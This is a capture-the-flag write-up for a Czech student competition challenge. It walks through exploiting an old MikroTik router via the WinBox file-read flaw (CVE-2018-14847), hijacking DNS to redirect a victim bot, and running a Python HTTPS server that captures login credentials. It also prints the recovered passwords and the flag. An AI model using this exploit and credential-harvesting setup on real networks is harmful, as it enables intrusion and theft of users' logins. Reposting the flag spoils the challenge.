<div align="center">

# 🧩 MacroAge

🇬🇧 **English** · [🇨🇿 Čeština](README.cs.md)

</div>

## Kybersoutěž 2. kolo 2026

> **Kybersoutěž** (lit. *Cyber Competition*) is the Czech national cybersecurity competition, open to students aged 9–24 from primary, secondary, and higher education institutions. Organised as a CTF-style event, it aims to develop digital skills, identify talent, and raise awareness of cybersecurity threats among the younger generation in the Czech Republic.

### Overview

A network/infrastructure challenge: connect to the competition's internal network over an SSH tunnel, break into an outdated, vulnerable MikroTik router, use that foothold to redirect another user's DNS traffic to an attacker-controlled server, harvest credentials, and finally log into an internal "meme store" application where the flag is hidden inside one of the memes.

**Challenge prompt (translated from Czech):**

> Together with you, your colleague Chrudoš also goes to your favourite café — and he's sitting on a goldmine of memes. Being a sneaky guy, he keeps them all to himself and refuses to share. You remember another colleague once bragged about finding a flaw in the café's network security. Can you find a flaw too, and get access to the memes?

**Network layout** provided with the challenge:

![Network diagram: laptop and a victim machine behind a MikroTik gateway, with a local DNS resolver](macroage-network-diagram.png)

---

### Attack chain

1. Connect to the challenge environment over an **SSH tunnel** (local port forwarding), so the internal services become reachable from the local machine.
2. Reach the old, vulnerable **MikroTik RouterOS** web management interface sitting at the network gateway.
3. Exploit it with **Metasploit / a public WinBox PoC** to pull credentials off the router.
4. Use the recovered router admin credentials to log in and **change the DNS configuration**, so that a victim user (the "robot" that periodically visits the meme store) resolves its target domain to an attacker-controlled server instead.
5. Stand up a fake login page on that attacker server to **capture the victim's credentials** when they get redirected to it.
6. Use those harvested credentials to log into the real meme store application.
7. Browse the gallery and find the flag hidden as text burned into one of the uploaded memes.

---

### Vulnerability Analysis

#### Step 1 — Reaching the internal network

The target services aren't directly reachable; the challenge requires tunnelling into the internal subnet first. An SSH tunnel with local port forwarding exposes the relevant internal hosts/ports on `localhost`, so subsequent requests and tooling can just target `127.0.0.1`:

```bash
ssh -L <local-port>:<internal-host>:<internal-port> user@<jump-host>
```

#### Step 2 — MikroTik WinBox exploitation

The gateway in the diagram is an old MikroTik router exposing its WinBox management service. This version is vulnerable to the well-known **arbitrary file read** issue in MikroTik's WinBox protocol (CVE-2018-14847), exploitable through the router's `/jsproxy` endpoint. Traffic captured during the exploit shows exactly this interaction against the router:

```
POST /jsproxy HTTP/1.1
Host: 10.89.5.5
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
```

Running a public WinBox file-read tool against the router pulls the user database (`user.dat`) straight off the device, which contains the local admin account and its password hash/plaintext:

```
$ ./winbox_fileread <router-ip> user.dat
 [0] admin
 [1] admin
 [2] admin	K3ktusW4sH3re??1
```

That's full admin access to the router's configuration.

#### Step 3 — Poisoning DNS to intercept the victim

With admin access to the router, the next step is to modify its **DNS settings** so that a specific hostname — the one the victim (the automated "robot" user that periodically logs into the meme store) actually uses — resolves to an attacker-controlled IP instead of the real meme store server.

A minimal HTTPS listener with a self-signed certificate matching the expected hostname is enough to make the browser/client accept the connection without immediately raising alarms:

```bash
# Generate a cert matching the hijacked hostname
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes \
    -subj "/CN=immch.kyblsoutez.cz"

# Minimal HTTPS "login" capture server
sudo python3 -c '
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b"<h1>Login</h1>")

    def do_POST(self):
        d = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        print(f"[!] {self.path}: {d.decode()}")
        self.send_response(200); self.end_headers()
        self.wfile.write(b"{\"status\":\"ok\"}")

s = HTTPServer(("0.0.0.0", 443), H)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("cert.pem", "key.pem")
s.socket = ctx.wrap_socket(s.socket, server_side=True)
s.serve_forever()'
```

Once the DNS change propagates and the victim's periodic login attempt gets redirected here instead of the real site, its credentials land directly in the console:

```
[!] /api/login: {"username":"useroiJEIwaUIYQEtPWsLQb892j2@mail.cz","password":"jLOvXYrNRF74"}
```

---

### Exploitation

With valid, harvested credentials in hand (`useroiJEIwaUIYQEtPWsLQb892j2@mail.cz` / `jLOvXYrNRF74`), logging into the real meme store application (reached through the same SSH tunnel) is as simple as opening it in a browser. After logging in, the meme gallery is right there — including Chrudoš's collection, with one image where the flag is burned directly into the picture as a caption:

![Meme containing the flag as part of its caption text](macroage-flag-meme.jpeg)

### Flag

```
NSKB{M1kroT1k_h4d_som3_flaws_d1dnt_he_h3h32?_sy2xys3VlTVbylwY}
```
</content>
